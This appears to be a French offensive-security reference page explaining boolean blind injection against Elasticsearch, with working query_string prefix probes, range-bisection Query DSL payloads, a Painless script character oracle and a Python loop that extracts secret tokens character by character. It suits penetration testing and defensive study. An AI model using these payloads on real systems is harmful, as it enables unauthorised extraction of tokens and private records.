---
order: 4
title: "Extraction de données en aveugle booléenne Elasticsearch"
description: "Lorsque seul le signal résultat-ou-pas-de-résultat est observable, des conditions de champ forgées sur query_string, Query DSL ou les requêtes script permettent à un attaquant de déduire et d'extraire les valeurs de documents caractère par caractère."
keywords:
  - injection en aveugle
  - inférence booléenne
  - Elasticsearch
  - extraction de données
  - requête prefix
  - extraction par caractère
---

# Extraction en aveugle booléenne

De nombreux endpoints Elasticsearch injectables ne renvoient jamais le document sensible ; ils n'exposent qu'un signal binaire : des résultats sont apparus, ou ils ne le sont pas. Une connexion qui réussit, une bannière « aucune correspondance », un statut HTTP différent, ou un `hits.total` modifié suffisent. L'extraction en aveugle fondée sur le booléen transforme ce bit unique en une lecture complète en posant une série de questions vrai/faux dont les réponses épellent la valeur cible.

## L'oracle

Toute surface injectable qui vous permet d'ajouter une condition fonctionne. Avec `query_string`, ajoutez une clause et observez si le document connu comme présent revient toujours :

```
name:target AND secret:A*
```

Si le document correspond, le secret commence par `A` ; s'il disparaît, ce n'est pas le cas. La même logique s'exprime à travers une clause `bool` ou une requête `script`.

## Parcours de préfixe avec caractères génériques

Les requêtes wildcard et prefix confirment une position de caractère à la fois. Ancrez-vous sur un document dont vous savez qu'il existe, puis étendez le préfixe :

```
id:42 AND token:a*
id:42 AND token:b*
...
id:42 AND token:f*      ← hit: first char is 'f'
id:42 AND token:fa*     ← test second char
id:42 AND token:fb*
```

Chaque préfixe confirmé restreint la supposition suivante à un seul balayage de l'alphabet. Pour un jeton sur un jeu de caractères de taille *n* et de longueur *L*, l'extraction coûte au plus *n × L* requêtes, réductible avec une recherche binaire sur les plages (ci-dessous).

## Bissection par plages

Les plages divisent par deux l'espace de recherche par requête au lieu de le scanner linéairement. Contre un champ numérique ou lexicographique :

```json
{ "bool": { "must": [
    { "term": { "id": 42 } },
    { "range": { "balance": { "gte": 50000 } } }
  ] } }
```

Resserrez `gte`/`lte` par bissection jusqu'à ce que la borne fixe la valeur exacte. Pour les champs de chaîne, les bornes de plage sur les sous-champs `keyword` sont ordonnées lexicalement, donc `{"range":{"token.keyword":{"gte":"fm","lt":"fn"}}}` teste une plage de préfixe.

## Oracle de caractère scripté

Lorsqu'une requête `script` est injectable, Painless lit un caractère directement, donnant un test par position propre et indépendant du comportement de l'analyseur :

```json
{ "query": { "script": { "script": {
    "source": "doc['id'].value == 42 && doc['token'].value.charAt(params.i) == params.c",
    "params": { "i": 0, "c": "f" }
} } } }
```

Itérez `i` à travers les positions et `c` à travers le jeu de caractères ; une correspondance confirme le caractère. `.length()` borne d'abord la boucle :

```painless
doc['id'].value == 42 && doc['token'].value.length() == 64
```

## Pilotage

La boucle est identique à l'extraction SQL en aveugle et s'automatise proprement :

```python
charset = "0123456789abcdef"      # adjust per field
known = ""
while True:
    for c in charset:
        q = f"id:42 AND token:{known}{c}*"
        if hit(search(q)):         # hit() = document present in response
            known += c
            break
    else:
        break                      # no extension matched: value complete
print(known)
```

`hit()` encapsule ce qui distingue le vrai du faux pour la cible : la présence dans `hits`, un `hits.total.value` non nul, une redirection, ou un écart de temporisation lorsque seule la latence diffère. Partir d'un document que vous contrôlez (un que vous avez créé, ou un enregistrement public devinable) donne un ancrage stable pour que chaque question isole un seul champ inconnu.

## Outils

- **curl** : émettre des requêtes de recherche et lire le signal résultat-ou-pas-de-résultat qui pilote l'oracle.
- **Burp Intruder** : automatiser les sondes de préfixe et de plage par caractère.

## Références

- [Elasticsearch: Prefix query](https://www.elastic.co/guide/en/elasticsearch/reference/current/query-dsl-prefix-query.html)
- [Elasticsearch: Range query](https://www.elastic.co/guide/en/elasticsearch/reference/current/query-dsl-range-query.html)
- [PayloadsAllTheThings: NoSQL Injection](https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/NoSQL%20Injection)
